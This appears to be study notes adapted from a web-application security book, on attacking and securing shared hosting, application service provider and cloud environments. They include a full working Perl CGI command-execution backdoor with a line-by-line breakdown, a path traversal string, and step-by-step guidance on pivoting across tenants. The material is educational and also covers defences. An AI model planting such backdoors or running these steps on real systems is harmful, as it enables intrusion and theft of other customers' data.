If several domain names resolve to the same IP address, the web server can still distinguish between them by inspecting this header.

##### Example: Apache Virtual Hosting Configuration

Web servers such as Apache can host multiple websites by defining separate *virtual host configurations.* Each configuration specifies the domain name and the directory that contains the site's files. Example configuration:

```
<VirtualHost *:80>
    ServerName wahh-appl.com
    DocumentRoot /www/appl
</VirtualHost>

<VirtualHost *:80>
    ServerName wahh-app2.com
    DocumentRoot /www/app2
</VirtualHost>
```

In this configuration:

- Requests containing ```Host: wahh-appl.com``` are served from ```/www/appl```

- Requests containing ```Host: wahh-app2.com``` are served from ```/www/app2```

This approach allows multiple websites to run on the same server while maintaining separate file structures. However, because the sites share the same operating system and server process, weaknesses in server configuration or application security may still allow attackers to move between sites.

##### Shared Application Services:

Some hosting providers go beyond simple infrastructure hosting and offer *ready-made applications* that customers can customize. These services are commonly referred to as *Application Service Providers (ASPs).* Instead of building an application from scratch, businesses can adopt an existing platform that is:

- branded for their organization

- configured with their business rules

- customized for their specific customers

This model can be extremely cost-effective in industries where many organizations need *similar functionality.*

##### Example: Financial Services Platforms

The financial services industry provides a good example of this model. A country may contain thousands of small retailers that want to offer services such as:

- in-store credit cards

- customer financing

- payment accounts

Rather than building their own complex systems, these retailers typically partner with credit card providers. Many of these providers—especially smaller startups—rely on an ASP to deliver the underlying web application used by their customers. As a result, the same application platform may serve *hundreds or thousands of businesses simultaneously,* with each instance customized for a particular retailer.

##### Layered Responsibility Model:

In these environments, responsibility for the system is distributed across multiple participants. A simplified conceptual structure looks like this:

```
Application Service Provider (platform operator)
        ↓
Credit Card Companies / Service Providers
        ↓
Retail Businesses
        ↓
End Users
```

Each layer depends on the security of the layers above and below it.

- The ASP maintains the underlying infrastructure and application platform.

- Credit card companies configure and operate services for retailers.

- Retailers interact with end users and manage customer relationships.

Because so many organizations rely on the same platform, *a single vulnerability can have cascading consequences.* A weakness at the ASP level may affect every organization using the platform. Likewise, misconfigurations by individual customers may introduce security risks that propagate throughout the environment.

For this reason, shared application service models often present *more complex security challenges* than basic shared hosting arrangements. The next section explores the additional security issues that arise in these environments.

### Attacking Shared Environments:

Shared hosting platforms and Application Service Provider (ASP) environments introduce additional security risks that do not typically exist in single-tenant deployments. Because multiple organizations operate within the same infrastructure, attackers may attempt to compromise *shared management mechanisms,* exploit weak isolation between customers, or leverage vulnerabilities in administrative systems.

In these environments, an attacker may not need to target the main application directly. Instead, they may focus on the *supporting systems that allow customers to manage their applications,* which often provide powerful access to the underlying infrastructure.

#### Attacks Against Access Mechanisms:

Customers of hosting providers usually require some form of *remote access* in order to manage their hosted applications. Depending on the hosting model, this access might allow customers to:

- upload and update application files

- manage databases

- configure application settings

- customize branding or functionality

The hosting provider must therefore implement mechanisms that allow these remote operations to be performed safely. However, these mechanisms can also introduce *additional attack surfaces.*

##### File Upload and Deployment Access:

In simple virtual hosting environments, customers are often given access to their web directories so they can upload or modify files. Traditionally, this access has been provided through protocols such as:

- FTP (File Transfer Protocol)

- SCP (Secure Copy Protocol)

- SFTP (SSH File Transfer Protocol)

Using these services, customers can upload application code, images, configuration files, and other resources into their assigned web root directory. If the access mechanism is poorly configured, however, attackers may attempt to exploit it to gain unauthorized access to the hosting environment.

##### Database Administration Access:

If the hosting provider offers database services alongside web hosting, customers may also require access to manage their databases. This may involve actions such as:

- creating tables

- modifying schemas

- performing backups

- retrieving stored data

Providers may expose these capabilities in several ways:

- web-based administrative panels

- remote database connections

- management tools such as phpMyAdmin or similar interfaces

In some environments, the database server itself may be accessible over the Internet, allowing customers to connect directly using database client tools. While convenient, exposing database services externally increases the potential attack surface.

##### Administrative Interfaces in ASP Platforms:

In full-scale ASP environments, the complexity of customer access often increases significantly. Different customers may need to perform different levels of customization within the shared application platform. For example, some customers may only change visual branding, while others may configure business rules or manage user accounts.

To support these operations, providers often deploy *custom administrative applications* that allow customers to manage their portion of the system. These interfaces are frequently accessed through:

- secure web portals

- Virtual Private Networks (VPNs)

- dedicated private network connections

Because these applications often have powerful capabilities, they become *high-value targets for attackers.*

#### Common Attacks Against Shared Access Mechanisms:

Given the variety of remote access systems that may exist, several types of attacks become possible.

##### Weak or Insecure Access Protocols:

The remote access mechanism itself may be insecure. For example, traditional FTP transmits credentials *in plaintext,* meaning that any attacker who can intercept network traffic may be able to capture usernames and passwords. This type of interception attack could be performed by:

- a malicious user within the same ISP

- an attacker on a compromised network segment

- a rogue wireless access point

In addition to weak protocols, the access software itself may contain:

- unpatched vulnerabilities

- authentication flaws

- configuration errors

These weaknesses may allow attackers to compromise the management interface and gain control over customer applications or stored data.

##### Excessive Privileges and Poor Segregation:

Another common issue arises when access controls between customers are poorly enforced. Customers may be granted *more privileges than necessary,* or isolation between customer environments may be incomplete. Examples of this problem include:

- customers receiving shell access when only file upload capability is required

- insufficient directory restrictions allowing users to access files outside their own web root

- shared system directories accessible to multiple customers

In poorly configured environments, one customer might be able to:

- modify another customer's website files

- read sensitive configuration files

- access system-level resources

Such weaknesses can allow attackers to compromise multiple hosted applications from a single foothold.

##### Database Segregation Failures:

Similar issues can occur within shared database environments. Ideally, each customer should have a *separate database instance or strictly isolated database account.* However, in poorly designed systems, multiple customers may share the same database server with insufficient access controls. Potential weaknesses include:

- database accounts with excessive privileges

- shared database schemas between customers

- weak authentication mechanisms

In some cases, direct database connections may also be permitted using *unencrypted protocols.* Historically, many applications accessed databases through technologies such as *ODBC (Open Database Connectivity).* ODBC is a standardized API that allows applications to communicate with different types of database systems through a common interface. While still widely supported today, modern environments typically use more specialized database drivers or frameworks.

Older systems sometimes exposed ODBC-based connections over insecure channels. If these connections were not protected with encryption (such as TLS), attackers could potentially intercept credentials or query data in transit.

##### Vulnerabilities in Administrative Applications:

In many ASP environments, a dedicated administrative application is used to allow customers to manage their portion of the platform. These applications often control:

- branding and customization

- configuration settings

- user management

- content updates

Because they act as a gateway into the shared system, vulnerabilities within these administrative interfaces can have severe consequences. For example, an attacker might exploit flaws such as:

- authentication bypass

- access control vulnerabilities

- command injection

- file upload vulnerabilities

A malicious customer—or even an external attacker—could potentially escalate privileges within the system. In some cases, a customer who is only permitted to modify superficial elements of their application (such as branding or layout) might exploit a vulnerability to modify deeper aspects of the system's functionality.

This could allow them to interfere with the applications of other customers or manipulate the core application logic used across the entire platform. When such administrative systems are compromised, attackers may gain a powerful position from which to target the shared application infrastructure used by all end users.

Overall, most big breaches don’t start with: *“Hack the main production application.”* They start with:

- the *file upload interface*

- the *customer admin panel*

- the *deployment pipeline*

- the *management API*

Basically the backstage door where the janitor forgot to lock the broom closet. And once inside, the whole theatre is yours.

### Attacks Between Applications:

In a shared hosting environment, multiple customers may upload and execute their own scripts on the same server. This immediately introduces risks that do not exist when an application is hosted on a dedicated system. Because the hosting provider must allow customers to deploy their own code, it becomes difficult to prevent one customer's application from interacting with or interfering with others. In such environments, attackers may attempt to exploit weaknesses in isolation between hosted applications or deliberately upload malicious code designed to compromise the server.

#### Deliberate Backdoors:

One of the most obvious attack strategies is for a malicious customer to upload a script that acts as a *backdoor* into the server. Because the hosting service must allow customers to run scripts, detecting malicious intent can be difficult. An attacker may disguise a backdoor as a legitimate application component while secretly enabling remote command execution.

The following example demonstrates a simple *Perl CGI backdoor* that allows remote execution of operating system commands.

```
#!/usr/bin/perl

use strict;
use warnings;
use CGI qw(:standard);

print header;
print start_html("Command Interface");

my $cmd = param('cmd');

if ($cmd) {
    my $output = `$cmd`;
    print "<pre>$output</pre>";
} else {
    print start_form();
    print "Command: ", textfield('cmd');
    print submit('Execute');
    print end_form();
}

print end_html;
```

This script creates a small web interface that allows a user to submit a command which is then executed on the server.

**Line-by-Line Breakdown:**

```
#!/usr/bin/perl
```

This tells the operating system to execute the script using the Perl interpreter.

```
use strict;
use warnings;
```

These directives enforce stricter variable usage and help catch programming mistakes.

```
use CGI qw(:standard);
```

This loads common CGI helper functions such as:

- ```param()``` for retrieving HTTP parameters

- ```start_form()``` and ```textfield()``` for generating HTML forms

- ```header()``` for returning HTTP headers

```
print header;
```

This outputs the required HTTP header so the web server knows the response contains HTML content.

```
print start_html("Command Interface");
```

This begins the HTML document.

```
my $cmd = param('cmd');
```

The script retrieves the value of the ```cmd``` parameter supplied in the HTTP request. For example:

```
http://example.com/backdoor.pl?cmd=whoami
```

This line is the critical vulnerability:

```
my $output = `$cmd`;
```

Backticks in Perl execute the command in the operating system shell and capture its output. Any command supplied by the user is therefore executed directly on the server.

```
print "<pre>$output</pre>";
```

The command output is displayed in the browser. *If no command parameter is supplied,* the script generates a simple HTML form:

```
print start_form();
print "Command: ", textfield('cmd');
print submit('Execute');
print end_form();
```

This allows a user to enter commands directly through the browser. If this script is accessible through the web server, an attacker could execute arbitrary commands such as:

```
GET /scripts/backdoor.pl?cmd=whoami HTTP/1.1
Host: wahh-maliciousapp.com
```

The server might return:

```
apache
```

This indicates that the command was executed with the privileges of the *Apache web server user.*

*Why This Is Dangerous?*

Web server processes usually run with permissions that allow them to access:

- application files

- configuration files

- uploaded content

- temporary data

If multiple customers share the same server, commands executed as the web server user may allow the attacker to access files belonging to other hosted applications. This can lead to:

- reading other customers' application code

- stealing configuration files containing database credentials

- modifying hosted content

- planting additional backdoors

Similar threats exist in Application Service Provider (ASP) environments. Although the main application platform is typically controlled by the provider, customers often have the ability to customize certain elements of the application. These customization points might include:

- themes or skins

- templates

- scripts or plugins

- business logic modules

A malicious customer may embed hidden backdoors into the code they are allowed to upload or modify. These backdoors could then be used to access other customers' data or compromise the underlying application platform.

Even when all customers act honestly, vulnerabilities within one application may still allow attackers to compromise other applications hosted on the same system. In this case, an attacker does not need to be a hosting customer. Instead, they exploit a vulnerability within one application and then pivot to other applications on the same server. Several common vulnerability types can enable this type of attack.

1. *SQL Injection:*

If one hosted application contains a SQL injection vulnerability, an attacker may be able to execute arbitrary database queries. If the shared database environment is poorly segregated, this could allow the attacker to access or modify data belonging to other hosted applications. For example, a vulnerable query such as:

```
SELECT * FROM users WHERE username='$input'
```

could allow an attacker to retrieve information from tables used by other customers.

2. *Path Traversal:*

A path traversal vulnerability may allow attackers to access files outside the intended application directory. For example:

```
../../../../var/www/otherapp/config.php
```

If file system permissions are poorly configured, attackers might be able to read sensitive files belonging to other applications. These files could include:

- database credentials

- API keys

- private configuration data

3. *Command Injection:*

A command injection vulnerability allows attackers to execute operating system commands through a vulnerable application. Once command execution is obtained, the attacker may gain control over the server itself. From that point, the attacker can often compromise other applications hosted on the same system in exactly the same way as a malicious hosting customer with a deliberate backdoor.

#### Attacks Between ASP Application Components:

All of the previously discussed attacks in shared hosting environments also apply to *Application Service Provider (ASP)* platforms. However, ASP environments introduce an additional layer of complexity.

Because customers are often allowed to *customize parts of a shared application,* a vulnerability introduced in one customer's customized component can potentially impact the *core shared application* itself. This creates a dangerous situation where a weakness in one tenant’s logic can cascade upward and compromise the entire platform.

##### Cross-Component Attack Vectors:

ASP applications are typically composed of multiple interconnected components:

- shared core application logic

- customer-specific customizations

- centralized data storage

- administrative interfaces

Because these components must interoperate, they often establish *trust relationships* that attackers can exploit.

##### Cross-Tenant XSS via Shared Data:

In many ASP environments, data generated by different customers is aggregated into a *centralized location.* This data may include:

- log entries

- transaction records

- customer profiles

- support tickets

These datasets are often viewed by *high-privileged ASP administrators.* If an attacker can inject malicious JavaScript into any of these shared data sources, a cross-tenant attack becomes possible. For example:

- Inject XSS payload into a log entry or profile field

- ASP administrator views the data

- Malicious JavaScript executes in the admin’s browser

- Attacker hijacks the admin session

At that point, the attacker may gain access to *powerful administrative functionality,* effectively compromising the entire shared application. Overall, this is:

```
Low-privileged tenant → shared storage → high-privileged admin → full platform compromise
```

It’s a vertical escalation through trust boundaries.

##### Shared Database Risks:

Many ASP platforms use a *single shared database* to store data for all customers. Even when logical separation is enforced, complete isolation is rarely perfect. Shared elements often include:

- stored procedures

- database functions

- triggers

- shared tables or metadata structures

##### Stored Procedure Risk:

Stored procedures are particularly dangerous when they run with elevated privileges (for example, *definer or owner* privileges). If a vulnerability exists within a shared stored procedure, such as SQL injection, an attacker may be able to:

- execute arbitrary queries

- bypass access controls

- access data belonging to other customers

For example, a shared stored procedure processes user input:

```
CALL process_payment(user_input);
```

If this procedure is vulnerable and executes with high privileges, an attacker might manipulate input to:

- query other tenants’ data

- modify records globally

- escalate privileges within the database

Even if applications are logically separated: **Shared execution logic = shared risk surface** One weak component can become a universal entry point.

#### Hack Steps:

1. **Analyze Customer Access Mechanisms:**

Carefully examine how customers interact with the shared environment. Ask questions such as:

- Are secure protocols used (e.g., SFTP instead of FTP)?

- Is the infrastructure hardened and properly configured?

- Are customers restricted strictly to their own resources?

- Can customers access system-level files or other tenants’ data?

- Is it possible to obtain an interactive shell?

Any weakness here can provide an initial foothold.

2. **Target Administrative or Customization Interfaces:**

If the environment includes a *custom management application,* treat it as a high-value target. Look for vulnerabilities such as:

- broken access control

- insecure direct object references (IDOR)

- file upload flaws

- injection vulnerabilities

Compromising this layer can provide access to both:

- the shared platform

- other customers’ applications

3. **Attempt Lateral Movement from a Single Application:**

If you gain access within one application (via RCE, SQLi, or file access), do not stop there. Actively investigate whether you can:

- access shared resources

- read configuration files

- pivot into other application directories

- reuse credentials

This is where shared environments often collapse.

4. **Identify and Abuse Shared Components:**

Look for components that are reused across tenants, such as:

- logging systems

- admin dashboards

- background processing jobs

- shared APIs

- database procedures

These are prime candidates for *cross-tenant attacks.* Try to inject malicious input into these shared pathways and observe how it propagates.

5. **Audit the Shared Database Layer:**

If a common database is in use, perform a deep inspection of:

- schema design

- access controls

- user privileges

- stored procedures

- patch levels

Weaknesses in the database layer often allow attackers to escalate from *one compromised application to entire customer base.*

NGSSquirrel (recommended in the book) is quite old and largely obsolete today. Modern tools you’re more likely to encounter include:

- *sqlmap* – still the king for SQL injection exploitation and database enumeration

- *NoSQLMap* – for NoSQL database attacks

- *BBQSQL* – blind SQL injection framework

- *jSQL Injection* – GUI-based SQL injection tool

In real-world engagements, though, many testers rely heavily on:

- manual testing via *Burp Suite*

- custom scripts

- situational awareness of database behavior

Because modern apps are messy, and automation only gets you halfway.

### Attacking the Cloud:

The term *“cloud”* broadly refers to the outsourcing of infrastructure, platforms, and applications to external providers, combined with heavy use of *virtualization and multi-tenancy.* Cloud services typically expose functionality through:

- web interfaces

- APIs

- automation tools

From a user’s perspective, traditional software and servers are replaced with *on-demand, remotely managed resources.* Instead of owning systems, users interact with *abstracted services.*

A fundamental issue in cloud computing is **loss of visibility and control.** Unlike traditional environments, users cannot:

- inspect underlying infrastructure

- verify patch levels

- audit internal configurations

Instead, they must *trust the provider completely.* This is not just a philosophical concern—it has real security implications. In traditional environments a vulnerability might affect one application or one organization. In cloud environments a single vulnerability can affect *thousands of customers* and each customer may have *their own users and infrastructure*. So, the impact multiplies dramatically.

**Example of Amplified Impact:**

- Broken access control in a normal app → unauthorized file access

- Broken access control in cloud → unauthorized *virtual machine or infrastructure access*

- Admin panel vulnerability in a normal app → data breach

- Admin panel vulnerability in cloud → *entire environments compromised*

**Encryption: Not a Silver Bullet**

Cloud providers often emphasize:

- encryption at rest

- encryption in transit

While important, these protections can be misleading. If an attacker successfully bypasses authentication or impersonates a legitimate user then the system will automatically decrypt data for them. Encryption protects data at rest, not *logic flaws or access control failures.*

#### Cloud-Specific Attack Surfaces:

While cloud implementations vary, several recurring vulnerability patterns exist.

##### Cloned Systems and Weak Entropy:

Cloud environments frequently rely on *cloned virtual machines.* If systems are cloned from the same image, they may share similar characteristics such as:

- system timestamps

- entropy pools

- hardware identifiers

If random number generation relies on predictable inputs, attackers who control one instance may:

- infer random seeds

- predict session tokens or keys

- weaken cryptographic operations

Modern systems mitigate this using improved entropy sources (e.g., ```/dev/urandom```, hardware RNGs). However, poorly configured or legacy systems may still exhibit this weakness—especially in:

- custom VM images

- embedded systems

- improperly initialized containers

##### Cloud Management Interfaces:

At the heart of every cloud platform is a *management interface.* This is typically a web application or an API used to:

- provision servers

- manage storage

- control networking

- monitor infrastructure

Many of these tools were originally internal administrative tools and later exposed to customers via the web. As a result, they may suffer from:

- weak session management

- poor access control

- insufficient role separation

Some insecure implementations have included:

- predictable tokens or GUIDs for access

- direct exposure of backend APIs

- unsafe object serialization endpoints

If compromised, these interfaces can provide *full control over cloud resources.*

##### Feature-First Design:

Cloud providers often prioritize *usability and features* over strict security controls. Customers are given:

- powerful interfaces

- extensive functionality

- broad access capabilities

However:

- features are rarely restricted

- opt-out security controls may be limited

Overall, more features = more attack surface. Every additional capability introduces:

- new inputs

- new trust boundaries

- new failure points

Attackers thrive in feature-rich environments because complexity creates *unexpected interactions.*

##### Token-Based Access:

Cloud services frequently use *long-lived tokens* instead of passwords. These tokens:

- identify devices or sessions

- allow automated access to resources

- are often stored locally

If an attacker obtains a valid token, they may:

- bypass authentication entirely

- access cloud resources as the victim

- maintain persistent access

**Common Sources of Token Leakage:**

- local storage in browsers

- configuration files

- exposed backups

- memory dumps

- improperly secured APIs

##### Web Storage and Client-Side Risks:

Cloud storage services are designed to be widely accessible and easy to use. They often support:

- browser-based access

- APIs (REST, WebDAV)

- synchronization clients

If users can upload content such as HTML files, an attacker may:

- upload malicious pages

- trick other users into accessing them

- execute scripts within the cloud service context

This can lead to:

- session hijacking

- credential theft

- cross-user attacks

**Same-Origin Policy Abuse:**

If an attacker can host content within the same domain as other users, they may exploit browser trust rules. For example:

- malicious scripts may interact with other resources on the same domain

- sensitive data may be accessible due to shared origin

The original text mentions Java JAR-based attacks. While less common today (due to browser restrictions and decline of Java applets), the concept still applies: *Any executable or scriptable content hosted within a trusted domain can become a delivery mechanism for attacks.*

Modern equivalents include:

- malicious JavaScript

- browser extensions

- embedded web components

Cloud environments don’t remove traditional vulnerabilities. They amplify them. Cloud isn’t really “someone else’s computer.” It’s *everyone else’s computer… stacked on top of yours.* And if something starts leaking at the top layer, it doesn’t drip: it *cascades.*

### Securing Shared Environments:

Shared environments introduce a unique dual threat model:

- *malicious customers* intentionally abusing the platform

- *benign customers* unintentionally introducing vulnerabilities

Because of this, security controls must go beyond traditional application security and focus heavily on:

- *access control*

- *isolation (segregation)*

- *trust boundaries*

Unlike single-tenant systems, failure in one area can affect *multiple independent customers simultaneously.*

#### Secure Customer Access:

Any mechanism that allows customers to manage their applications must be treated as a *critical security boundary.*

**Strong Authentication and Transport Security:**

Remote access mechanisms should:

- enforce strong authentication (multi-factor where possible)

- use encrypted protocols (e.g., SFTP, HTTPS, SSH)

- be hardened against common attacks

Unencrypted or weakly secured channels (like legacy FTP) expose credentials to interception and compromise.

**Least-Privilege Access:**

Customers should only be granted the *minimum permissions necessary* to perform their tasks. Examples:

- File access should be restricted to the customer’s own directory

- No access to system files or other tenants’ data

- Database access should use low-privileged accounts scoped to specific schemas

This ensures that even if a customer account is compromised, the attacker’s reach is limited.

**Hardened Administrative Interfaces:**

If a custom application is used for managing customer environments, it must be treated as *high-risk infrastructure.* It should undergo:

- rigorous security testing

- strict access control enforcement

- continuous monitoring

Because *compromise of the management layer = compromise of everything beneath it.*

#### Segregating Customer Functionality:

You cannot assume customers will deploy safe or secure code. Therefore, the environment must be designed so that one customer's failure does not become everyone’s failure.

**Operating System Isolation:**

Each customer’s application should run under a *separate operating system identity.* This ensures:

- file access is restricted per customer

- processes are isolated

- lateral movement is harder

**Restricting System Capabilities:**

Access to powerful OS features should be tightly controlled. This includes:

- shell execution

- system commands

- sensitive APIs

Even if a vulnerability exists, limiting these capabilities reduces the attacker’s ability to escalate.

**Database Isolation:**

Shared databases must enforce strict separation. Best practices include:

- separate database instances per customer (ideal)

- or strictly isolated schemas and roles

- least-privileged database accounts

This prevents attackers from pivoting across tenants through database access.

#### A Note on PHP Safe Mode (and Why It Failed):

Historically, some shared hosting environments relied on *PHP safe mode* to limit what scripts could do. Safe mode attempted to:

- restrict access to sensitive functions

- limit file system operations

*Why This Approach Was Flawed?*

Safe mode operated at the *application layer,* not the system layer. This created a dangerous assumption that *the operating system trusts the application runtime to enforce security.* In practice:

- safe mode had multiple bypasses

- restrictions were inconsistent

- attackers could often work around limitations

Because of these issues, safe mode was *deprecated and removed* in modern PHP versions. If you gain code execution in a PHP environment, running:

```
phpinfo();
```

can reveal:

- enabled/disabled functions

- configuration restrictions

- file paths

- environment details

This information is extremely valuable for determining *post-exploitation options.*

#### Segregating Components in Shared Applications:

In ASP-style environments, the challenge becomes even more subtle. Here, the application itself is composed of:

- shared core components (provider-controlled)

- customizable components (customer-controlled)

**Enforcing Trust Boundaries:**

Any data flowing between these components must be treated as *untrusted.* For example:

- input from a customer customization module

- data passed into shared stored procedures

- content rendered in shared admin interfaces

Even though this data originates “inside” the system, it must be handled as if it came directly from an attacker.

**Testing Across Boundaries:**

Each component should be tested not only in isolation, but also:

- against adjacent components

- across trust boundaries

This helps identify:

- injection points

- privilege escalation paths

- cross-component vulnerabilities

**High-Risk Shared Components:**

Special attention should be given to:

- logging systems

- administrative interfaces

- shared APIs

- database procedures

These components often:

- aggregate data from multiple tenants

- operate with elevated privileges

Which makes them ideal targets for *cross-tenant attacks.*

### Summary:

Application architecture is not just a design concern—it is a *security control surface.* Well-designed architectures can:

- limit the impact of vulnerabilities

- contain breaches within a single component

Poorly designed architectures can:

- amplify small flaws

- enable attackers to pivot across layers

- lead to full system compromise

Shared hosting and ASP environments introduce complex trust relationships that do not exist in single-tenant systems. When attacking these environments, the focus should extend beyond the target application itself. You should actively investigate whether it is possible to:

- escape the application boundary

- compromise the shared infrastructure

- pivot into other customer environments

Overall, in isolated systems, a vulnerability is a crack. In shared systems it’s a *fault line.* And when it shifts, it reshapes the entire landscape beneath everyone standing on it.

## Reflection & Introspection:

1. **Command Execution on the Application Server → Database Data:**

Question: *You can execute arbitrary OS commands on the application server. Can you retrieve sensitive data from the database?*

Yes — very often, this leads directly to full database compromise. Even though the database runs on a separate server, the application server typically:

- stores *database credentials* (in config files, environment variables, etc.)

- has *network access* to the database server

- is already trusted by the database

From OS command execution, you can:

- read configuration files (e.g., ```config.php```, ```.env```)

- extract database credentials

- connect to the database using native clients (```mysql```, ```psql```, etc.)

- dump sensitive data

In some cases, you may also:

- tunnel traffic

- pivot into the database server

- exploit database services directly

2. **Command Execution on Database Server → Application Server:**

Question: *You can execute OS commands on the database server. Can you compromise the application server?*

Yes — but it depends on architecture and network access. If you achieve OS command execution on the database server, you may be able to:

- initiate outbound connections to the application server

- scan internal network services

- exploit exposed services (SSH, SMB, APIs, etc.)

- reuse credentials stored on the DB server

- pivot laterally

However, directly modifying application scripts is *not guaranteed,* because:

- the application server may be a separate host

- file systems are usually not shared

- network segmentation may block access

So the attack becomes: *Database server → network pivot → application server compromise.*

3. **Attacking a Neighbor in Shared Hosting:**

Question: *You have hosting on the same server. Can you compromise the target application?*

Yes — this is a classic shared hosting attack scenario. By uploading your own scripts, you may be able to:

- execute commands as the shared web server user (e.g., ```www-data```, ```apache```)

- read other applications’ files if permissions are weak

- access shared directories

- inspect configuration files

- extract credentials

- modify other applications

If isolation is poor, you may achieve *full cross-application compromise.*

4. **Why LAMP on One Server Is Risky?**

Question: *Why does running Linux, Apache, MySQL, and PHP on the same machine weaken security?*

Because it collapses all trust boundaries into one system. If an attacker compromises one component (e.g., via:

- SQL injection

- command injection

- file inclusion

they may gain access to:

- application logic

- database data

- system-level resources

This eliminates *defense-in-depth* and allows *single vulnerability → total system compromise.*

5. **Detecting ASP / Shared Application Environments:**

Question: *How can you identify that an application is part of a larger shared platform?*

You can look for indicators such as:

***Application Behavior:***

- similar functionality across different domains

- consistent UI patterns across unrelated organizations

- shared error messages or structures

***Technical Clues:***

- identical cookies or session formats across apps

- shared API endpoints

- common authentication flows

- multi-tenant identifiers in requests

***Infrastructure Indicators:***

- shared IP addresses

- virtual hosting patterns

- common TLS certificates

- similar HTTP headers

***Content & Data Clues:***

- references to other tenants

- shared resources (e.g., images, scripts)

- cross-tenant data leakage bugs
